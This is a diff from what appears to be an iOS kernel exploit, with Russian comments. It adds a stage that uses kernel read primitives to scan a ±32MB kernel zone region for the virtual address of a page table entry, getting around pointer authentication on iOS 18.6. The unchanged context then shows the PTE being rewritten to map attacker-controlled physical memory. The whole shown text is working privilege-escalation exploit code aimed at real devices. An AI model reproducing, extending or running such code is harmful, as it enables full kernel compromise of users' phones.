@@ -7727,6 +7727,42 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             } else {
                 kpNote(r, @"  [P5] seg-структуры вне табличного региона — proof не состоялся");
             }
+            // 1.9.212: P6 — zone-VA листа контент-поиском по ЗОНЕ (pv на 18.6
+            // PAC-хэширован — head=0xaa09…). origPTE уникален: сканируем окно
+            // ±32MB вокруг seg-кластера драйвера (таблицы того же аллокатора).
+            // Дыры зоны пропускает walker-гейт, чтение kreadbuf постранично.
+            if (!pteVA && ptePAFound && origPTE) {
+                uint64_t mn = ~0ULL, mx = 0;
+                for (uint32_t i = 0; i < 8; i++) {
+                    uint64_t s = kpLooksLikeKernelPointer(dartVA) ? kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8)) : 0;
+                    if (!kpLooksLikeKernelPointer(s)) continue;
+                    if (s < mn) mn = s;
+                    if (s > mx) mx = s;
+                }
+                if (mn != ~0ULL) {
+                    uint64_t lo = (mn & ~0x3fffULL) - 0x2000000ULL;
+                    uint64_t hi = (mx & ~0x3fffULL) + 0x2000000ULL;
+                    int nPages = 0, nMapped = 0;
+                    kpNote(r, [NSString stringWithFormat:@"  [P6] zone-скан окна [%#llx..%#llx) на origPTE %#018llx",
+                              (unsigned long long)lo, (unsigned long long)hi, (unsigned long long)origPTE]);
+                    for (uint64_t pg = lo; pg < hi && !pteVA; pg += 0x4000) {
+                        nPages++;
+                        if (!kpSafeToRead(pg)) continue;   // дыра/защищённая — тихо мимо
+                        nMapped++;
+                        uint8_t zbuf[0x4000];
+                        kreadbuf(pg, zbuf, sizeof(zbuf));
+                        for (uint32_t o = 0; o + 8 <= sizeof(zbuf) && !pteVA; o += 8) {
+                            uint64_t q = 0; memcpy(&q, zbuf + o, 8);
+                            if (q != origPTE) continue;
+                            if ((pg + o) == (ptePAFound & ~0x3fffULL)) continue;   // physmap-алиас сам себя
+                            pteVA = pg + o;
+                            kpNote(r, [NSString stringWithFormat:@"  [P6] ★ ZONE-АЛИАС листа @ %#llx (qword %#018llx) — запись PTE через zone",
+                                      (unsigned long long)pteVA, (unsigned long long)q]);
+                        }
+                    }
+                    if (!pteVA) kpNote(r, [NSString stringWithFormat:@"  [P6] окно обойдено: страниц=%d mapped=%d — origPTE в зоне не найден (расширить?)", nPages, nMapped]);
+                }
+            }
         }
         if (pteVA) {
             uint64_t newPTE = (origPTE & ~ptePAMask) | (ctlPA & ptePAMask);
